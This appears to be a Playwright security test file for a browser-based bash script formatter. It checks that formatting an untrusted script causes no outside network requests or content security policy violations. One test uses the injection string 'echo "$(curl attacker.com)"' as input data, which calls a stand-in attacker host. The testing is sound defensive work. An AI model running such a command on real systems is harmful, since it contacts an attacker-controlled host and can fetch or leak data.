import { test, expect } from "@playwright/test";
import { readFileSync } from "fs";
import { resolve, dirname } from "path";
import { fileURLToPath } from "url";

const __dirname = dirname(fileURLToPath(import.meta.url));

const MALICIOUS_SCRIPT = readFileSync(
  resolve(__dirname, "../fixtures/malicious.sh"),
  "utf-8"
);

test.describe("Security", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto("/");
    await expect(page.getByTestId("status-text")).toHaveText(
      /WASM loaded/,
      { timeout: 10_000 }
    );
  });

  test("no external network requests when formatting malicious scripts", async ({
    page,
  }) => {
    const externalRequests: string[] = [];
    page.on("request", (request) => {
      const url = new URL(request.url());
      if (
        url.hostname !== "localhost" &&
        url.hostname !== "127.0.0.1" &&
        !url.hostname.endsWith("googleapis.com") &&
        !url.hostname.endsWith("gstatic.com")
      ) {
        externalRequests.push(request.url());
      }
    });

    await page.getByTestId("input-editor").fill(MALICIOUS_SCRIPT);
    await page.getByTestId("format-button").click();

    await page.waitForTimeout(2_000);

    expect(externalRequests).toHaveLength(0);
  });

  test("command injection strings are formatted as text, not executed", async ({
    page,
  }) => {
    const injectionInput = '#!/bin/bash\necho "$(curl attacker.com)"';

    await page.getByTestId("input-editor").fill(injectionInput);
    await page.getByTestId("format-button").click();

    const output = page.getByTestId("output-area");
    await expect(output).not.toContainText(
      "Formatted output will appear here",
      { timeout: 10_000 }
    );

    const outputText = await output.textContent();
    expect(outputText).toContain("curl attacker.com");
  });

  test("no CSP violations during formatting", async ({ page }) => {
    const cspViolations: string[] = [];
    page.on("console", (msg) => {
      if (
        msg.type() === "error" &&
        msg.text().toLowerCase().includes("content security policy")
      ) {
        cspViolations.push(msg.text());
      }
    });

    await page.getByTestId("input-editor").fill(MALICIOUS_SCRIPT);
    await page.getByTestId("format-button").click();
    await page.waitForTimeout(2_000);

    expect(cspViolations).toHaveLength(0);
  });
});
